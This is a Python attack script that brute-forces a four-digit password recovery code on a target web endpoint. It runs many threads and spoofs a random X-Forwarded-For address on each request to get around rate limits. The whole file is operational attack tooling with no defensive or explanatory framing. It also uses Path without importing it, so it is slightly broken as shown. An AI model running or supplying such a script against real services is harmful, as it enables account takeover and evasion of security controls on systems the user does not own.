import requests
import random
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Brute-force 4-digit recovery code")
parser.add_argument("-u", "--url", required=True, help="Target Url")
parser.add_argument("-H", "--headers", type=Path, help="Path to headers file (one 'Name: value' per line)")
parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
args = parser.parse_args()
s_list = []
URL = args.url
headers = args.headers

def parse_headers_file(path: Path) -> dict:
    """
    Parse a headers file where each non-empty line is: Header-Name: value
    Lines starting with # are treated as comments and ignored.
    """
    headers = {}
    for lineno, raw in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            raise ValueError(f"Invalid header line {lineno}: {raw!r} (expected 'Name: value')")
        name, value = line.split(":", 1)
        headers[name.strip()] = value.lstrip()  # preserve spaces after colon as part of value
    return headers

HEADERS = parse_headers_file(headers)

def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def try_code(code_str):
    HEADERS["X-Forwarded-For"] = random_ip()
    data = {
        "recovery_code": code_str,
        "s": "179"  # Replace if dynamic
    }
    try:
        r = requests.post(URL, headers=HEADERS, data=data, timeout=3)
        if "Invalid or expired recovery code!" not in r.text:
            return code_str
    except requests.RequestException:
        pass
    print(f"[-] Wrong code: {code_str}")
    return None

with ThreadPoolExecutor(max_workers=args.threads) as executor:
    futures = {executor.submit(try_code, f"{i:04d}"): i for i in range(10000)}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"[+][+][+][+][+][+][+] Found code: {result}")
            s_list.append(result)
            executor.shutdown(wait=False)
            break

for s in s_list:
    print(f"Success Code:{s}")
